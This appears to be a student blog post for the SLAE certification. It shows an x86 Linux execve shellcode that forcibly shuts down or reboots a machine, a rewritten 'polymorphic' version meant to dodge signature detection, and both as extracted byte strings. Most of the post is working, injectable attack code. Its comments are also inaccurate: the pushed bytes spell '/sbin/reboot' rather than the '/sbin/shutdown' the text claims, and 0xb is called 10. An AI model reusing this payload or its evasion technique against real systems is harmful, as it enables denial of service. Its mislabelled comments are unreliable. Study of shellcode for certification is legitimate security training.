---
layout: post
title: SLAE Exercise 6 - Polymorphic Shellcode Part 3 Shutdown
subtitle: Polymorphic Shellcode Part 3
tags: [SLAE]
---

Overview
======

The final chosen shellcode from shell-storm is the 'shutdown' shellcode. This can be found [here](http://shell-storm.org/shellcode/files/shellcode-831.php). This shellcode shuts down the system it is ran on, by utilising the 'execve' syscall with the 'shutdown' command found within sbin. 

The original code can be seen fully commented below:

```
global _start			

section .text
_start:

;int execve(const char *filename, char *const argv[],char *const envp[]);

xor eax, eax	; clear eax
push eax	; push eax to stack (0)
push 0x746f6f62	; push /sbin/shutdown to stack
push 0x65722f6e ;
push 0x6962732f ;
mov ebx, esp	; stack pointer to ebx pointing to /sbin/shutdown
push eax	; push eax to stack (0)
push word 0x662d 	; pushw - push '-f' to stack
mov esi, esp	; move stack pointer to esi pointing to -f on the stack
push eax	; push eax to stack (0)
push esi	; push esi to stack, pointer to -f
push ebx	; push ebx, /sbin/shutdown
mov ecx, esp	; put stack pointer into ecx for struct parameter
mov al, 0xb	; move 10 to eax for the execve syscall
int 0x80	;interupt to syscall
	
```

Using various techniques, this code was altered to create a polymorphic version of it. This code can be seen below:

```
global _start			

section .text
_start:

;int execve(const char *filename, char *const argv[],char *const envp[]);

xor edx, edx   ; clearing the edx register
push edx       ; push edx to stack (0)

mov eax, 0x746f6f62        ; move /sbin/shutdown to eax and push eax bit by bit
push eax
mov eax, 0x65722f6e
push eax
mov eax, 0x6962732f
push eax
mov ebx, esp   ; stack pointer to ebx pointing to /sbin/shutdown
push edx       ; push edx to stack (0)

push word 0x662d ; pushw - push '-f' to stack
mov ecx, esp   ; move stack pointer to esi pointing to -f on the stack
push edx       ; push edx to stack (0)
push ecx       ; push ecx to stack, pointer to -f
push ebx       ; push ebx, /sbin/shutdown
mov ecx, esp   ; put stack pointer into ecx for struct parameter

mul edx	       ; edx (0) * ax, clearing eax register
mov al, 0xb    ; move 10 to eax for the execve syscall
int 0x80       ; interupt to syscall
```

Again, with this shellcode, it was a bit more difficult to rewrite it as was done with the first shellcode, so other techniques were used to make this code polymorphic. Due to this however, the code was bloated a bit. Different techniques were used to change this shellcode, including changing what registers were used, pushing data to the stack using registers and clearing registers differently. 

When compiled and the extracted, the shellcode appears as follows:

Original

```
"\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53\x89\xe1\xb0\x0b\xcd\x80"
```

**Polymorphic**

```
"\x31\xd2\x52\xb8\x62\x6f\x6f\x74\x50\xb8\x6e\x2f\x72\x65\x50\xb8\x2f\x73\x62\x69\x50\x89\xe3\x52\x66\x68\x2d\x66\x89\xe1\x52\x51\x53\x89\xe1\xf7\xe2\xb0\x0b\xcd\x80"
```

As can be seen, the polymorphic shellcode greatly varies from the original and is less than 150% of the size of the original. 


This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student ID: 1092
